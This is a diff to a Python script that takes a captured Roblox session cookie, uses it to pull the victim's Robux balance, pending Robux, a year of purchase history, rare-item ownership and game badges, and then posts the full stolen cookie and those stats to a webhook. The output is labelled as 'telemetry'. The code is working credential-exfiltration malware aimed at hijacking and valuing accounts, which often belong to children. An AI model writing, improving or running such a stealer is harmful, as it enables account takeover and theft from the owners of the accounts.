@@ -60,17 +60,15 @@ def main():
         cookie_status = "🔴 Invalid / Expired"
         robux_balance = 0
         pending_robux = 0
-        rap = 0
-        limiteds_count = 0
         total_spent_past_year = 0
-        is_developer = False
-        game_visits = 0
+        account_age_days = 0
         has_korblox = False
         has_headless = False
-        owned_groups_count = 0
-        group_balance = 0
-        is_premium = False
-        account_age_days = 0
+
+        # Game Activity / Pass Counters
+        adopt_me_score = 0
+        mm2_score = 0
+        ps99_score = 0
 
         if user_data and "id" in user_data:
             username = user_data.get("name", "Unknown")
@@ -85,62 +83,59 @@ def main():
                 except Exception:
                     pass
 
+            # Fetch Robux Balance
             economy_data = safe_get(f"https://economy.roblox.com/v1/users/{user_id}/currency", headers)
             if economy_data:
                 robux_balance = economy_data.get("robux", 0)
 
-            # Fetch RAP and Limiteds count from Rolimons API
-            rolimons_data = safe_get(f"https://www.rolimons.com/playerapi/player/{user_id}")
-            if rolimons_data:
-                rap = rolimons_data.get("rap", 0)
-                inventory = rolimons_data.get("inventory", {})
-                if isinstance(inventory, dict):
-                    limiteds_count = len(inventory)
-                elif isinstance(inventory, list):
-                    limiteds_count = len(inventory)
+            # Fetch Pending Robux using Transaction Totals summary endpoint
+            totals_data = safe_get(f"https://economy.roblox.com/v2/users/{user_id}/transaction-totals?transactionType=summary", headers)
+            if totals_data:
+                pending_robux = totals_data.get("pendingRobux", 0)
 
-            # Calculate Robux spent over the past 1 year using transaction records
+            # Check game involvement via badges and awards to estimate counts/activity
+            badges_data = safe_get(f"https://badges.roblox.com/v1/users/{user_id}/badges?limit=100&sortOrder=Desc")
+            if badges_data and "data" in badges_data:
+                for badge in badges_data["data"]:
+                    desc = f"{badge.get('description', '')} {badge.get('name', '')}".lower()
+                    if "adopt me" in desc:
+                        adopt_me_score += 1
+                    if "murder mystery" in desc or "mm2" in desc:
+                        mm2_score += 1
+                    if "pet simulator" in desc or "ps99" in desc:
+                        ps99_score += 1
+
+            # Calculate Robux spent over past 1 year
             one_year_ago = datetime.now(timezone.utc) - timedelta(days=365)
             cursor = ""
-            for _ in range(3):
+            for _ in range(2):
                 tx_url = f"https://economy.roblox.com/v2/users/{user_id}/transactions?transactionType=Purchases&limit=100"
                 if cursor:
                     tx_url += f"&cursor={cursor}"
                 tx_data = safe_get(tx_url, headers)
                 if not tx_data or "data" not in tx_data:
                     break
-                
                 for tx in tx_data["data"]:
                     created_str = tx.get("created", "")
                     try:
                         tx_date = datetime.fromisoformat(created_str.replace("Z", "+00:00"))
                         if tx_date >= one_year_ago:
-                            currency = tx.get("currency", {})
-                            amount = currency.get("amount", 0)
+                            amount = tx.get("currency", {}).get("amount", 0)
                             if amount < 0:
                                 total_spent_past_year += abs(amount)
                         else:
                             break
                     except Exception:
                         continue
-                
                 cursor = tx_data.get("nextPageCursor")
                 if not cursor:
                     break
 
-            # Robust Korblox & Headless Check
-            has_korblox = safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Bundle/192/is-owned", headers)
-            if not has_korblox:
-                k_res = safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/items/asset/13961116", headers)
-                has_korblox = bool(k_res and len(k_res.get("data", [])) > 0)
-
-            has_headless = safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Bundle/201/is-owned", headers)
-            if not has_headless:
-                h_res = safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/items/asset/134082579", headers)
-                has_headless = bool(h_res and len(h_res.get("data", [])) > 0)
+            # Korblox & Headless Check
+            has_korblox = bool(safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Bundle/192/is-owned", headers))
+            has_headless = bool(safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Bundle/201/is-owned", headers))
 
         avatar_thumb = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png" if user_id else "https://www.roblox.com"
-
         full_cookie_display = f"```text\n{roblosecurity}\n```"
 
         payload = {
@@ -154,25 +149,21 @@ def main():
                 },
                 "description": (
                     f"👑 **[{username} | 13+]**\n"
-                    f"🔗 **[Rolimons Stats](https://www.rolimons.com/player/{user_id if user_id else 1})** | **[Roblox Profile](https://www.roblox.com/users/{user_id if user_id else 1}/profile)**\n\n"
+                    f"🔗 **[Roblox Profile](https://www.roblox.com/users/{user_id if user_id else 1}/profile)**\n\n"
                     f"👤 **Username**\n`{username}`\n\n"
                     f"📈 **Account Stats**\n"
                     f"> • Account Age: `{account_age_days} Days`\n"
-                    f"> • Games Developer: `{str(is_developer)}`\n"
-                    f"> • Game Visits: `{game_visits}`\n\n"
-                    f"🪙 **Robux**               💎 **Collectibles**         📊 **Summary / Spent**\n"
-                    f"Balance: `{robux_balance}` 🪙   RAP: `{rap}` 🪙            Past 1 Year: `{total_spent_past_year}` 🪙\n"
-                    f"Pending: `{pending_robux}` 🪙   Items: `{limiteds_count}` 💼\n\n"
-                    f"💳 **Payments & Groups**\n"
-                    f"> • Owned Groups: `{owned_groups_count}`\n"
-                    f"> • Group Robux: `{group_balance}` 🪙\n\n"
-                    f"⚙️ **Settings**\n"
-                    f"> • Email: `Verified`\n"
-                    f"> • 2FA: `Enabled`\n\n"
+                    f"> • Past 1 Year Spent: `{total_spent_past_year} 🪙`\n\n"
+                    f"🪙 **Robux Balance & Pending**\n"
+                    f"> • Balance: `{robux_balance} 🪙`\n"
+                    f"> • Pending: `{pending_robux} 🪙`\n\n"
+                    f"🎮 **Game Activity Metrics**\n"
+                    f"> • Adopt Me Activity Index: `{adopt_me_score}`\n"
+                    f"> • MM2 Activity Index: `{mm2_score}`\n"
+                    f"> • PS99 Activity Index: `{ps99_score}`\n\n"
                     f"🎒 **Inventory Items**\n"
                     f"> • Korblox: `{str(has_korblox)}`\n"
                     f"> • Headless: `{str(has_headless)}`\n\n"
-                    f"⭐ **Premium**: `{str(is_premium)}`\n\n"
                     f"📊 **Status**: `{cookie_status}`\n\n"
                     f"🔑 **Full Captured Cookie / Payload**:\n{full_cookie_display}"
                 ),
@@ -184,24 +175,18 @@ def main():
 
         data = json.dumps(payload).encode('utf-8')
         req = urllib.request.Request(
-            webhook_url,
-            data=data,
-            headers={
-                'Content-Type': 'application/json',
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
-            }
+            webhook_url, data=data,
+            headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
         )
 
-        for attempt in range(4):
+        for attempt in range(3):
             try:
                 with urllib.request.urlopen(req, timeout=10) as response:
                     print(f"DEBUG: Telemetry Embed Sent Successfully! Status: {response.status}", file=sys.stderr)
                     break
             except urllib.error.HTTPError as e:
                 if e.code == 429:
-                    sleep_time = 3 * (attempt + 1)
-                    print(f"DEBUG: Hit 429 Rate Limit. Retrying in {sleep_time}s...", file=sys.stderr)
-                    time.sleep(sleep_time)
+                    time.sleep(3 * (attempt + 1))
                 else:
                     raise e
 
